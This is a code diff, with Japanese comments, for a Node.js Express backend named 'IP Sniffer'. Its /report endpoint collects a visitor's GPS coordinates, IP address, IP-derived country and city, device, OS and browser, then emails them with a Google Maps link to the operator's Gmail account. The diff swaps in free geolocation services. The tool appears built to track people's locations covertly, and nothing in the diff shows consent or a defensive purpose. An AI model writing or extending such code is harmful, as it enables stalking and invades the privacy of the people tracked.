@@ -1,3 +1,4 @@
+// 完全無課金構成バージョンのNode.jsバックエンド
 require('dotenv').config();
 const express = require('express');
 const nodemailer = require('nodemailer');
@@ -15,26 +16,16 @@ app.post('/report', async (req, res) => {
   const { latitude, longitude } = req.body;
   const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
+  // 無料APIを使ったIPジオ情報取得（精度は中程度）
   let geo = {};
   try {
-    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
     geo = await geoRes.json();
   } catch (err) {
     console.error('IPジオAPIエラー:', err);
   }
 
-  let addressInfo = '不明';
-  try {
-    const geoRes = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=${process.env.GOOGLE_API_KEY}`);
-    const geoData = await geoRes.json();
-    if (geoData.status === 'OK') {
-      addressInfo = geoData.results[0]?.formatted_address || '不明';
-    }
-  } catch (err) {
-    console.error('Google逆ジオコーディングエラー:', err);
-  }
-
-  // ✉️ Gmailで送信
+  // Gmail送信用のトランスポーター
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -44,16 +35,18 @@ app.post('/report', async (req, res) => {
   });
 
   const mailOptions = {
-    from: `"IP Sniffer" <${process.env.GMAIL_USER}>`,
+    from: `IP Sniffer <${process.env.GMAIL_USER}>`,
     to: process.env.GMAIL_USER,
-    subject: '📡 アクセス情報通知',
+    subject: '📡 アクセス情報通知（無料構成）',
     text: `
-📸 アクセス情報：
+📡 アクセス情報：
 - IPアドレス: ${ip}
-- IP推定地域: ${geo.country_name || '不明'} / ${geo.region || '不明'} / ${geo.city || '不明'}
-- GPS精密住所: ${addressInfo}
-- 端末: ${ua.device.type || 'PC'} / ${ua.os.name} / ${ua.browser.name}
+- 国: ${geo.country || '不明'}
+- 地域: ${geo.regionName || '不明'}
+- 市区町村: ${geo.city || '不明'}
+- 緯度/経度: ${latitude || '不明'} / ${longitude || '不明'}
 - Google Maps: ${locationLink}
+- 端末: ${ua.device.type || 'PC'} / ${ua.os.name || '不明'} / ${ua.browser.name || '不明'}
 - アクセス時間: ${new Date().toLocaleString()}
     `
   };
